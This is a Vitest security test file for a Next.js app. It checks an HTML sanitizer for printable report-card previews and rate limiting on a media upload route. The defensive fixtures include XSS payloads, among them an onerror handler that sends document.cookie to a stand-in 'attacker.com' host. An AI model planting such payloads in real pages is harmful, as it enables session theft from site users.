import { describe, it, expect } from 'vitest';
import { sanitizeDocumentHtml } from '@/lib/security/html_sanitizer';
import { NextRequest } from 'next/server';
import { POST as uploadMediaRoute } from '@/app/api/media/upload/route';
import { clearRateLimit } from '@/lib/security/rate_limiter';

describe('Security Hardening — HTML Sanitization & Media Controls', () => {
  describe('HTML Sanitizer for Printable Document Previews (sanitizeDocumentHtml)', () => {
    it('returns empty string for null, undefined, or empty input without throwing', () => {
      expect(sanitizeDocumentHtml('')).toBe('');
      expect(sanitizeDocumentHtml(null as any)).toBe('');
      expect(sanitizeDocumentHtml(undefined as any)).toBe('');
    });

    it('strips <script> tags and enclosed executable code', () => {
      const malicious = '<div><p>Official School Report</p><script>alert("XSS Vulnerability")</script></div>';
      const clean = sanitizeDocumentHtml(malicious);
      expect(clean).not.toContain('<script');
      expect(clean).not.toContain('alert("XSS Vulnerability")');
      expect(clean).toContain('Official School Report');
    });

    it('strips inline DOM event handlers (onload, onerror, onclick, onmouseover)', () => {
      const malicious = '<img src="invalid.jpg" onerror="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)" alt="photo" /><a href="#" onclick="evil()">Click</a>';
      const clean = sanitizeDocumentHtml(malicious);
      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('onclick');
      expect(clean).not.toContain('evil()');
      expect(clean).toContain('<img src="invalid.jpg" alt="photo" />');
    });

    it('strips javascript: pseudo-protocol URIs in anchors and links', () => {
      const malicious = '<a href="javascript:alert(document.domain)">Click to View Document</a>';
      const clean = sanitizeDocumentHtml(malicious);
      expect(clean).not.toContain('javascript:');
      expect(clean).not.toContain('alert(document.domain)');
      expect(clean).toContain('Click to View Document');
    });

    it('strips dangerous framing elements like <iframe>, <object>, and <embed>', () => {
      const malicious = '<p>Certificate</p><iframe src="https://phishing.site"></iframe><object data="malicious.swf"></object>';
      const clean = sanitizeDocumentHtml(malicious);
      expect(clean).not.toContain('<iframe');
      expect(clean).not.toContain('<object');
      expect(clean).toContain('Certificate');
    });

    it('preserves legitimate document formatting, tables, typography, and styling', () => {
      const legitimate = `
        <div class="report-card">
          <h1>Swanford Academy — Term Report</h1>
          <p>Student Name: <strong>Amina Bello</strong></p>
          <table border="1">
            <thead>
              <tr><th>Subject</th><th>Score</th><th>Grade</th></tr>
            </thead>
            <tbody>
              <tr><td>Mathematics</td><td>95</td><td>A</td></tr>
              <tr><td>English</td><td>88</td><td>A</td></tr>
            </tbody>
          </table>
        </div>
      `;
      const clean = sanitizeDocumentHtml(legitimate);
      expect(clean).toContain('Swanford Academy — Term Report');
      expect(clean).toContain('Mathematics');
      expect(clean).toContain('<table border="1">');
      expect(clean).toContain('<strong>Amina Bello</strong>');
    });
  });

  describe('Public Media Upload Rate Limiting (/api/media/upload)', () => {
    const testIp = '198.51.100.99';

    it('enforces IP rate limiting on excessive upload attempts', async () => {
      clearRateLimit(`media_upload:${testIp}`);

      // Fire 15 requests (the quota is 15 req / min)
      for (let i = 0; i < 15; i++) {
        const formData = new FormData();
        const fakeFile = new File(['fake image bytes'], 'test.jpg', { type: 'image/jpeg' });
        formData.append('file', fakeFile);

        const req = new NextRequest('http://localhost:3000/api/media/upload', {
          method: 'POST',
          headers: {
            'x-real-ip': testIp,
          },
          body: formData,
        });

        const res = await uploadMediaRoute(req);
        // Might fail with 400 for invalid magic bytes or 200/401, but NOT 429 yet
        expect(res.status).not.toBe(429);
      }

      // The 16th request MUST be rate limited with 429
      const excessReq = new NextRequest('http://localhost:3000/api/media/upload', {
        method: 'POST',
        headers: {
          'x-real-ip': testIp,
        },
      });

      const excessRes = await uploadMediaRoute(excessReq);
      expect(excessRes.status).toBe(429);
      const json = await excessRes.json();
      expect(json.error).toMatch(/too many upload attempts/i);

      clearRateLimit(`media_upload:${testIp}`);
    });
  });
});
